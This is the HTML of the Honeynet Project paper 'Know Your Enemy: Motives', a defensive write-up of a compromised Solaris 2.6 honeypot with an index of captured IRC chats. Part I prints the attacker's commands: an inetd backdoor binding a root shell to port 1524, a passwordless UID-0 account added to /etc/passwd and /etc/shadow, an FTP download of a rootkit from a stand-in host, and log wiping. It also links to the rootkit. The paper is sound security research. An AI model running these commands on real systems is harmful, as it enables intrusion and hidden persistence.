@@ -1,0 +1,692 @@
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="description" content="Tools and methods used by most common black hat threat on the Internet, the Script Kiddie">
+   <meta name="keywords" content="hacking,security,script kiddie,exploits,scans,black hat,root,tools,methods">
+   <title>Know Your Enemy</title>
+<style type="text/css">
+<!--
+a:active {  text-decoration: none}
+a:hover {  text-decoration: none}
+a:link {  text-decoration: none}
+a:visited {  text-decoration: none}
+-->
+</style>
+</head>
+<body link="#0000FF">
+
+<center>
+<font face="Palatino,Book Antiqua"><font size=+4>Know Your Enemy: Motives</font></font>
+<br><i><font face="Palatino,Book Antiqua"><font size=+1>The
+Motives and Psychology of the Black-hat Community</font></font></i>
+<p>
+<a href="mailto:project@honeynet.org?Subject=Honeynet Project">Honeynet Project</a>
+<br>
+<a href="http://project.honeynet.org">
+http://project.honeynet.org</a>
+<br>
+Last Modified: 27 June, 2000
+</center>
+
+<p>
+<font face="Arial, Helvetica, sans-serif" size="2">
+This paper is a continuation of
+the <a href="../enemy/index.html">Know Your Enemy</a>
+series.  This series is dedicated to learning the tools and tactics
+of the black-hat community. Unlike the previous papers which focused purely on 
+the "what" and "how" of the black-hat community, specifically the technical tools,
+their use and implementation,  this paper explores the motivation and psychology 
+of the black-hat community, in their very own words. Part I starts with the compromise
+of a Solaris 2.6 system. Part II provides information
+rarely published,  a record of conversations and actions which took place over a fourteen-day 
+period following the compromise of a honeypot system.
+Learn how and why black-hats attack systems. Once the Solaris 2.6 system was
+compromised, the black-hat put an IRC bot on our system.&nbsp; This bot,
+configured and implemented by the black-hat, captured all their conversations
+on an IRC channel.&nbsp; We monitored these conversations over a two week
+period, all of which are contained here.&nbsp; This paper is not meant
+to be a generalization of the black-hat community. Instead, we present
+a specific incident involving several individuals. However, this should
+give you an idea of how certain members can think and behave. This is a
+common threat that we all face in the security community, and we 
+sincerely hope other security professionals benefit from this work.
+<p>
+This information was obtained
+through the use of a honeynet. A honeynet is a network of various 
+<a href="../honeypot/index.html">honeypots,</a>
+designed to be compromised by the black-hat community.  While some honeypots 
+are used to divert the attention of attackers from legitimate systems, the purpose
+of a honeynet is to learn the tools and tactics of the black-hat community.
+Most of the information provided in this document has been sanitized.&nbsp; Specifically,
+user identities and passwords, credit card numbers, and most of the system
+names involved have all been changed. However, the actual technical tools and the chat
+sessions themselves have not been sanitized. All this information was forwarded
+to both CERT and the FBI before being released.&nbsp;&nbsp; Also, over
+370 notifications were sent out to administrators of systems we believed
+were compromised.</font></b>
+
+<p>
+<font size=+2>
+<b><a href="../motives/forward.html">Foreword</a></b></font>, by Brad Powell
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Part I: The Compromise</font></font></b>
+<br>A Solaris 2.6 default installation was used for our honeypot. No modifications
+or patches were installed on the system. The vulnerabilities discussed
+here exist in any default, unpatched installation of Solaris 2.6. That
+is the whole purpose of the honeynet, to identify vulnerabilities in production
+systems and learn how they are exploited. When exploited, we can then learn the tools and tactics of the
+black-hat community. The honeynet itself is an environment designed to
+track the black-hat's every move.
+<p>
+On June 4, 2000 our Solaris 2.6 honeypot was compromised with the rpc.ttdbserv
+Solaris exploit, which allows the execution of code via a
+buffer overflow in the ToolTalk object database server 
+<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0003">(CVE-1999-0003).</a>
+Note that this exploit is also listed as #3 in 
+<a href="http://www.sans.org/topten.htm">SANS Top Ten List</a>.
+This attack was both detected and alerted by <a href="http://www.snort.org">snort</a>,
+a sniffer based IDS system.
+<p>
+<font face="Courier New,Courier"><font size=-1>Jun 4 11:37:58 lisa snort[5894]:
+<a href="http://dev.whitehats.com/IDS/241">IDS241/rpc.ttdbserv-solaris-kill:</a>
+192.168.78.12:877 -> 172.16.1.107:32775</font></font>
+<p>
+The rpc.ttdbserv exploit is a buffer overflow attack that allows the remote 
+user to execute commands on the system as 
+root. The following command was executed, giving the black-hat a backdoor.  
+The service ingreslock (predefined in /etc/services as port 1524) is added to a file 
+called '/tmp/bob', and then inetd is executed with '/tmp/bob' as the configuration file.
+/bin/sh is then bound to port 1524 and is running as root, giving the remote user
+root access.
+<p>
+<font face="Courier New,Courier"><font size=-1>/bin/ksh -c echo 'ingreslock
+stream tcp nowait root /bin/sh sh -i' >>/tmp/bob ; /usr/sbin/inetd -s /tmp/bob.</font></font>
+<p>
+Once the black-hat created this backdoor, he connected to port 1524,
+accessed a shell as root, and executed the following commands.&nbsp; He
+creates two user accounts, so he can telnet back in.&nbsp; Notice the errors
+and control characters, the shell on port 1524 does not have a proper environment.
+<p>
+<font face="Courier New,Courier"><font size=-1># cp /etc/passwd /etc/.tp;</font></font>
+<br><font face="Courier New,Courier"><font size=-1>^Mcp /etc/shadow /etc/.ts;</font></font>
+<br><font face="Courier New,Courier"><font size=-1>echo "r:x:0:0:User:/:/sbin/sh"
+>> /etc/passwd;</font></font>
+<br><font face="Courier New,Courier"><font size=-1>echo "re:x:500:1000:daemon:/:/sbin/sh"
+>> /etc/passwd;</font></font>
+<br><font face="Courier New,Courier"><font size=-1>echo "r::10891::::::"
+>> /etc/shadow;</font></font>
+<br><font face="Courier New,Courier"><font size=-1>echo "re::6445::::::"
+>> /etc/shadow;</font></font>
+<br><font face="Courier New,Courier"><font size=-1>: not found</font></font>
+<br><font face="Courier New,Courier"><font size=-1># ^M: not found</font></font>
+<br><font face="Courier New,Courier"><font size=-1># ^M: not found</font></font>
+<br><font face="Courier New,Courier"><font size=-1># ^M: not found</font></font>
+<br><font face="Courier New,Courier"><font size=-1># ^M: not found</font></font>
+<br><font face="Courier New,Courier"><font size=-1># ^M: not found</font></font>
+<br><font face="Courier New,Courier"><font size=-1># who;</font></font>
+<br><font face="Courier New,Courier"><font size=-1>rsides&nbsp;&nbsp;&nbsp;&nbsp;
+console&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; May 24 21:09</font></font>
+<br><font face="Courier New,Courier"><font size=-1>^M: not found</font></font>
+<br><font face="Courier New,Courier"><font size=-1># exit;</font></font>
+<p>
+Our black-hat now has two accounts on our compromised system.&nbsp;
+He can now telnet it as the user 're', then su to the user 'r', which has
+UID 0, thus gaining root access.&nbsp; We will now review
+the actual keystrokes of the black-hat as they do just that, and more.
+<p><font face="Courier New,Courier"><font size=-1>&nbsp;!"' !"P#$#$'LINUX'</font></font>
+<p><font face="Courier New,Courier"><font size=-1>SunOS 5.6</font></font>
+<p><font face="Courier New,Courier"><font size=-1>login: re</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Choose a new password.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>New password: abcdef</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Re-enter new password:
+abcdef</font></font>
+<br><font face="Courier New,Courier"><font size=-1>telnet (SYSTEM): passwd
+successfully changed for re</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Sun Microsystems Inc.&nbsp;&nbsp;
+SunOS 5.6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Generic August 1997</font></font>
+<br><font face="Courier New,Courier"><font size=-1>$ su r</font></font>
+<p>Our black-hat now has root access.&nbsp; As common, the next step is
+retrieve the rootkit and take control of the system .&nbsp; First, we see the black-hat create a 'hidden'
+directory to hide the rootkit.
+<p><font face="Courier New,Courier"><font size=-1># mkdir /dev/".. "</font></font>
+<br><font face="Courier New,Courier"><font size=-1># cd /dev/".. "</font></font>
+<p>After creating the directory, the black-hat retrieves the rootkit from
+another system.
+<p><font face="Courier New,Courier"><font size=-1># ftp shell.example.net</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Connected to shell.example.net.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>220 shell.example.net
+FTP server (Version 6.00) ready.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Name (shell.example.net:re):
+j4n3</font></font>
+<br><font face="Courier New,Courier"><font size=-1>331 Password required
+for j4n3.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Password:abcdef</font></font>
+<br><font face="Courier New,Courier"><font size=-1>230 User j4n3 logged
+in.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>ftp> get sun2.tar</font></font>
+<br><font face="Courier New,Courier"><font size=-1>200 PORT command successful.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>150 Opening ASCII mode
+data connection for 'sun2.tar' (1720320 bytes).</font></font>
+<br><font face="Courier New,Courier"><font size=-1>226 Transfer complete.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>local: sun2.tar remote:
+sun2.tar</font></font>
+<br><font face="Courier New,Courier"><font size=-1>1727580 bytes received
+in 2.4e+02 seconds (6.90 Kbytes/s)</font></font>
+<br><font face="Courier New,Courier"><font size=-1>ftp> get l0gin</font></font>
+<br><font face="Courier New,Courier"><font size=-1>200 PORT command successful.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>150 Opening ASCII mode
+data connection for 'l0gin' (47165 bytes).</font></font>
+<br><font face="Courier New,Courier"><font size=-1>226 Transfer complete.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>226 Transfer complete.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>local: l0gin remote:
+l0gin</font></font>
+<br><font face="Courier New,Courier"><font size=-1>47378 bytes received
+in 7.7 seconds (6.04 Kbytes/s)</font></font>
+<br><font face="Courier New,Courier"><font size=-1>ftp> quit</font></font>
+<br><font face="Courier New,Courier"><font size=-1>U221 Goodbye.</font></font>
+<p>Once the rootkit is successfully downloaded, the kit is untared and
+installed.&nbsp; Notice how the entire rootkit is installed by executing
+a single script, <a href="../motives/setup.txt">setup.sh</a>.
+This script also calls another script, <a href="../motives/secure.txt">secure.sh</a>.
+You can download the entire <a href="../motives/sun2.rootkit.tar.gz">Solaris
+rootkit used in this attack here</a>.
+<p><font face="Courier New,Courier"><font size=-1># tar -xvf sun2.tar</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2, 0 bytes, 0 tape
+blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/me, 859600 bytes,
+1679 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/ls, 41708 bytes,
+82 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/netstat, 6784
+bytes, 14 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/tcpd, 19248 bytes,
+38 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/setup.sh, 1962
+bytes, 4 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/ps, 35708 bytes,
+70 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet, 0 bytes,
+0 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/sunst,
+9760 bytes, 20 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/bc, 9782
+bytes, 20 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/sm, 32664
+bytes, 64 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/newbc.txt,
+762 bytes, 2 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/syn, 10488
+bytes, 21 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/s1, 12708
+bytes, 25 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/sls, 19996
+bytes, 40 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/smaq,
+10208 bytes, 20 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/udp.s,
+10720 bytes, 21 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/bfile,
+2875 bytes, 6 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/bfile2,
+3036 bytes, 6 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/bfile3,
+20118 bytes, 40 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/packet/sunsmurf,
+11520 bytes, 23 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/sys222, 34572
+bytes, 68 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/m, 9288 bytes,
+19 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/l0gin, 47165
+bytes, 93 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/sec, 1139 bytes,
+3 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/pico, 222608
+bytes, 435 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/sl4, 28008 bytes,
+55 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/fix, 10360 bytes,
+21 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/bot2, 508 bytes,
+1 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/sys222.conf,
+42 bytes, 1 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/le, 21184 bytes,
+42 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/find, 6792 bytes,
+14 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/bd2, 9608 bytes,
+19 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/snif, 16412 bytes,
+33 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/secure.sh, 1555
+bytes, 4 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/log, 47165 bytes,
+93 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/check, 46444
+bytes, 91 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/zap3, 13496 bytes,
+27 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/idrun, 188 bytes,
+1 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/idsol, 15180
+bytes, 30 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/sniff-10mb, 16488
+bytes, 33 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1>x sun2/sniff-100mb,
+16496 bytes, 33 tape blocks</font></font>
+<br><font face="Courier New,Courier"><font size=-1># rm sun2.tar</font></font>
+<br><font face="Courier New,Courier"><font size=-1># mv l0gin sun2</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#cd sun2</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#./setup.sh</font></font>
+<br><font face="Courier New,Courier"><font size=-1>hax0r w1th K1dd13</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Ok This thing is complete
+:-)</font></font>
+<p>
+Here the rootkit installation script first cleans out the log files to 
+delete the information associated with the black-hat's activities.
+<p><font face="Courier New,Courier"><font size=-1>- WTMP:</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/adm/wtmp is Sun
+Jun&nbsp; 4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/usr/adm/wtmp is Sun
+Jun&nbsp; 4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/etc/wtmp is Sun Jun&nbsp;
+4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/log/wtmp cannot
+open</font></font>
+<br><font face="Courier New,Courier"><font size=-1>WTMP = /var/adm/wtmp</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Removing user re at
+pos: 1440</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Done!</font></font>
+<br><font face="Courier New,Courier"><font size=-1>- UTMP:</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/adm/utmp is Sun
+Jun&nbsp; 4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/usr/adm/utmp is Sun
+Jun&nbsp; 4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/etc/utmp is Sun Jun&nbsp;
+4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/log/utmp cannot
+open</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/run/utmp cannot
+open</font></font>
+<br><font face="Courier New,Courier"><font size=-1>UTMP = /var/adm/utmp</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Removing user re at
+pos: 288</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Done!</font></font>
+<br><font face="Courier New,Courier"><font size=-1>- LASTLOG:</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/adm/lastlog is
+Sun Jun&nbsp; 4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/usr/adm/lastlog is
+Sun Jun&nbsp; 4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/etc/lastlog cannot
+open</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/log/lastlog cannot
+open</font></font>
+<br><font face="Courier New,Courier"><font size=-1>LASTLOG = /var/adm/lastlog</font></font>
+<br><font face="Courier New,Courier"><font size=-1>User re has no wtmp
+record. Zeroing lastlog..</font></font>
+<br><font face="Courier New,Courier"><font size=-1>- WTMPX:</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/adm/wtmpx is Sun
+Jun&nbsp; 4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/usr/adm/wtmpx is Sun
+Jun&nbsp; 4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/etc/wtmpx is Sun Jun&nbsp;
+4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/log/wtmpx cannot
+open</font></font>
+<br><font face="Courier New,Courier"><font size=-1>WTMPX = /var/adm/wtmpx</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Done!</font></font>
+<br><font face="Courier New,Courier"><font size=-1>- UTMPX:</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/adm/utmpx is Sun
+Jun&nbsp; 4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/usr/adm/utmpx is Sun
+Jun&nbsp; 4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/etc/utmpx is Sun Jun&nbsp;
+4 11:47:39 2000</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/log/utmpx cannot
+open</font></font>
+<br><font face="Courier New,Courier"><font size=-1>/var/run/utmpx cannot
+open</font></font>
+<br><font face="Courier New,Courier"><font size=-1>UTMPX = /var/adm/utmpx</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Done!</font></font>
+<br><font face="Courier New,Courier"><font size=-1>./setup.sh: ./zap: not
+found</font></font>
+<p>After cleaning the log files, the next step is to secure our system
+(how nice of them).&nbsp; They know we are an easy kill and they do not want
+anyone else to ruin their compromised system.
+<p><font face="Courier New,Courier"><font size=-1>./secure.sh: rpc.ttdb=:
+not found</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: securing.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: 1) changing modes
+on local files.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: will add more local
+security later.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: 2) remote crap like
+rpc.status , nlockmgr etc..</font></font>
+<br><font face="Courier New,Courier"><font size=-1>./secure.sh: usage:
+kill [ [ -sig ] id ... | -l ]</font></font>
+<br><font face="Courier New,Courier"><font size=-1>./secure.sh: usage:
+kill [ [ -sig ] id ... | -l ]</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: 3) killed statd ,
+rpcbind , nlockmgr</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: 4) removing them
+so they ever start again!</font></font>
+<br><font face="Courier New,Courier"><font size=-1>5) secured.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp; 207 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:00 inetd</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;11467 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:00 inetd</font></font>
+<br><font face="Courier New,Courier"><font size=-1>cp: cannot access /dev/..
+/sun/bot2</font></font>
+<br><font face="Courier New,Courier"><font size=-1>kill these processes@!#!@#!</font></font>
+<br><font face="Courier New,Courier"><font size=-1>cp: cannot access lpq</font></font>
+<br><font face="Courier New,Courier"><font size=-1>./setup.sh: /dev/ttyt/idrun:
+cannot execute</font></font>
+<p>Next, an IRC proxy is launched.&nbsp; What is bizarre is that later
+on the script kills this process.&nbsp; I have no idea why.
+<p><font face="Courier New,Courier"><font size=-1>Irc Proxy v2.6.4 GNU
+project (C) 1998-99</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Coded by James Seter
+:bugs-> (Pharos@refract.com) or IRC pharos on efnet</font></font>
+<br><font face="Courier New,Courier"><font size=-1>--Using conf file ./sys222.conf</font></font>
+<br><font face="Courier New,Courier"><font size=-1>--Configuration:</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp; Daemon
+port......:9879</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp; Maxusers.........:0</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp; Default
+conn port:6667</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp; Pid
+File.........:./pid.sys222</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp; Vhost
+Default....:-SYSTEM DEFAULT-</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp; Process
+Id.......:11599</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Exit ./sys222{7} :Successfully
+went into the background.</font></font>
+<p>More file modifications are done.&nbsp; Not seen from the script output
+are the copying of Trojan binaries, including /bin/login, /bin/ls, /usr/sbin/netstat,
+and /bin/ps.&nbsp; I highly recommend you review the source of the 
+<a href="../motives/setup.txt">setup.sh</a>
+script and the 
+<a href="../motives/secure.txt">secure.sh</a>
+script to see what actually happens.&nbsp; One
+day you may have to review a system that has been rooted with a similar
+kit.
+<p><font face="Courier New,Courier"><font size=-1># kill -9 11467</font></font>
+<br><font face="Courier New,Courier"><font size=-1># ps -u root |grep |grep
+inetd inetd</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp; 207 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:00 inetd</font></font>
+<br><font face="Courier New,Courier"><font size=-1># ..U/secure.sh/secure.sh</font></font>
+<br><font face="Courier New,Courier"><font size=-1>./secure.sh: rpc.ttdb=:
+not found</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: securing.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: 1) changing modes
+on local files.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: will add more local
+security later.</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: 2) remote crap like
+rpc.status , nlockmgr etc..</font></font>
+<br><font face="Courier New,Courier"><font size=-1>./secure.sh: usage:
+kill [ [ -sig ] id ... | -l ]</font></font>
+<br><font face="Courier New,Courier"><font size=-1>./secure.sh: usage:
+kill [ [ -sig ] id ... | -l ]</font></font>
+<br><font face="Courier New,Courier"><font size=-1>./secure.sh: usage:
+kill [ [ -sig ] id ... | -l ]</font></font>
+<br><font face="Courier New,Courier"><font size=-1>./secure.sh: usage:
+kill [ [ -sig ] id ... | -l ]</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: 3) killed statd ,
+rpcbind , nlockmgr</font></font>
+<br><font face="Courier New,Courier"><font size=-1>#: 4) removing them
+so they ever start again!</font></font>
+<br><font face="Courier New,Courier"><font size=-1>5) secured.</font></font>
+<br><font face="Courier New,Courier"><font size=-1># ppUs -u s -u U||U
+grep&nbsp; grep ttUtdbtdb</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Ups: option requires
+an argument -- u</font></font>
+<br><font face="Courier New,Courier"><font size=-1>usage: ps [ -aAdeflcj
+] [ -o format ] [ -t termlist ]</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+[ -u userlist ] [ -U userlist ] [ -G grouplist ]</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+[ -p proclist ] [ -g pgrplist ] [ -s sidlist ]</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp; 'format' is one
+or more of:</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+user ruser group rgroup uid ruid gid rgid pid ppid pgid sid</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+pri opri pcpu pmem vsz rss osz nice class time etime stime</font></font>
+<br><font face="Courier New,Courier"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+f s c tty addr wchan fname comm args</font></font>
+<br><font face="Courier New,Courier"><font size=-1># ppUs -s -UAdj | grep
+ttdbAdj | grep ttdb</font></font>
+<p>Last, our black-hat launches an IRC bot.&nbsp; The purpose of this bot
+is to ensure they will maintain ops on the IRC channel of their choice.&nbsp;
+This bot also recorded all their conversations on the IRC channel.&nbsp;
+It is this bot that they installed on our compromised system that relayed
+their IRC chats on our network.
+<p><font face="Courier New,Courier"><font size=-1># ../me -f bot2</font></font>
+<br><font face="Courier New,Courier"><font size=-1>init: Using config file:
+bot2</font></font>
+<br><font face="Courier New,Courier"><font size=-1>EnergyMech 2.7.1, December
+2nd, 1999</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Starglider Class EnergyMech</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Compiled on Jan 27 2000
+07:06:04</font></font>
+<br><font face="Courier New,Courier"><font size=-1>Features: DYN, NEW,
+SEF</font></font>
+<br><font face="Courier New,Courier"><font size=-1>init: Unknown configuration
+item: "NOSEEN" (ignored)</font></font>
+<br><font face="Courier New,Courier"><font size=-1>init: Mechs added [
+save2 ]</font></font>
+<br><font face="Courier New,Courier"><font size=-1>init: Warning: save2
+has no userlist, running in setup mode</font></font>
+<br><font face="Courier New,Courier"><font size=-1>init: EnergyMech running...</font></font>
+<br><font face="Courier New,Courier"><font size=-1># exit;</font></font>
+<br><font face="Courier New,Courier"><font size=-1>$ exit</font></font>
+<p>
+Once the bot was in place, they left the system alone. It is this bot that 
+captured all of their conversations (see Part II below). For more 
+information on IRC and how the black-hat community uses IRC and bots, we highly 
+recommend the paper <a href="http://theorygroup.com/Theory/irc.html">Tracking Hackers on IRC</a>
+by David Brumley. Over the course of the following week they returned several times, 
+only to confirm that they still had access. One week later, on 11 June, they 
+connected again and attempted to use the system for Denial of Service attacks. 
+However, the honeynet is designed to block any attempt to use a honeypot as 
+a base of an attack against outside systems. All attempts to use the honeypot for a 
+Denial of Service attack were automatically blocked. 
+<p>
+What we have witnessed here are commonly used tools and tactics of the
+black-hat community.&nbsp; Our black-hat randomly scanned the Internet
+for a known vulnerability (in this case rpc.ttdbserv).&nbsp; Once identified,
+they quickly compromised the system and installed a rootkit using commonly
+scripted tools.&nbsp; Once they had control, they installed a bot, most
+likely to ensure they would maintain 'ops' on the IRC channels of their
+choice. What is uncommon are the two weeks of IRC chat sessions that their
+bot captured for us. In the next part of this paper, we discover the motivations
+and psychology of the black-hat community, in their own words. If you are
+concerned that your system(s) may have been compromised by similar means, review
+<a href="../motives/check.txt">this checklist</a>.
+ It covers what to check for and links on how to react to a system compromise.
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Part II: The IRC
+Chat Sessions</font></font></b>
+<br>Below are the actual chat sessions of the black-hat community, specifically
+two individuals whom we will call D1ck and J4n3. Most of their chats will
+happen on the IRC channel we will call K1dd13. You will read the activities
+of these two main characters, and a variety of others.&nbsp; The chat sessions
+are broken down by days, listed below.&nbsp; We recommend you read them
+in sequence, so you can better understand what is going on.&nbsp; IRC channels,
+IRC nicks, system names and IP addresses have been sanitized. All system
+IP addresses have been replaced with RFC 1918 address space, all system
+domain names have been replaced with 'example', and all credit card numbers
+have been placed by 'xxxx'. Any similarities the IRC channels
+or IRC nicks may have with the real world are purely coincidental. Be advised, some of the
+language used is abusive in nature, we have chosen not to sanitize this.&nbsp;
+Also, sometimes several of the black-hats will speak foreign languages.
+Where possible, we have translated this into English. As you read these
+chat sessions, take into consideration their lack of skill and networking
+knowledge. Often you will see them attempting to figure out the most fundamental
+of Unix skills. And yet, they are still able to compromise or damage a
+large number of systems. This is not a threat to take lightly.
+<br>&nbsp;
+<ul>
+<li>
+<a href="../motives/day1.txt">Day 1, June
+04</a></li>
+<br>Our chat sessions begin with the discussion of building an exploit
+archive and the sharing of exploits to be used against potential targets.
+<p>
+
+<li>
+<a href="../motives/day2.txt">Day 2, June
+05</a></li>
+<br>Today D1ck and J4n3 share exploits and Denial of Service attacks. Notice
+how they brag about how many blists (broadcast amplifier networks) they
+have for the attacks. Looks like one of them is gunning for Linux boxes
+in .edu land. They also discussed using new rootkits for Linux and sparc.
+<p>
+
+<li>
+<a href="../motives/day3.txt">Day 3, June
+06</a></li>
